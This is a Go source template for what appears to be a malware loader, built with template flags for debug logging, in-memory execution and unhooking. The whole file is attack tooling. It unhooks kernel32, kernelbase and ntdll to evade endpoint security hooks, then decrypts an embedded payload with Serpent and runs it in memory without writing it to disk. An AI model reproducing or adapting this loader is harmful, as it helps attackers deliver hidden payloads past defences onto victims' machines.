package main

import (
	_ "embed"
	//{{if .Debug}}
	"log"
	//{{end}}
	"github.com/coremedic/goldr/pkg/crypter"

	//{{if .Memexec}}
	"os/exec"

	"github.com/amenzhinsky/go-memexec"
	//{{end}}

	//{{if .Unhook}}
	"github.com/coremedic/goldr/pkg/evasion"
	//{{end}}
)

var (
	//go:embed "key"
	key []byte
	//go:embed "cryptbin"
	cryptbin []byte
)

func main() {
	//{{if .Unhook}}
	err := evasion.UnHookDll(`c:\windows\system32\kernel32.dll`)
	if err != nil {
		//{{if .Debug}}
		log.Printf("Failed to unhook kernel32: %s\n", err.Error())
		//{{end}}
		return
	}
	err = evasion.UnHookDll(`c:\windows\system32\kernelbase.dll`)
	if err != nil {
		//{{if .Debug}}
		log.Printf("Failed to unhook kernelbase: %s\n", err.Error())
		//{{end}}
		return
	}
	err = evasion.UnHookDll(`c:\windows\system32\ntdll.dll`)
	if err != nil {
		//{{if .Debug}}
		log.Printf("Failed to unhook ntdll: %s\n", err.Error())
		//{{end}}
		return
	}
	//{{end}}

	//{{if .Memexec}}
	bin, err := crypter.SerpentDecrypt(cryptbin, key)
	if err != nil {
		//{{if .Debug}}
		log.Printf("Failed to decrpyt payload: %s\n", err.Error())
		//{{end}}
		return
	}
	exe, err := memexec.New(bin)
	if err != nil {
		//{{if .Debug}}
		log.Printf("Failed to create memexec obj: %s\n", err.Error())
		//{{end}}
		return
	}
	defer exe.Close()
	cmd := exe.Command()
	err = cmd.Run()
	if err != nil {
		//{{if .Debug}}
		if exiterr, ok := err.(*exec.ExitError); ok {
			log.Printf("Execution failed with ExitCode: %d\n", exiterr.ExitCode())
		}
		//{{end}}
		return
	}

	//{{end}}
}
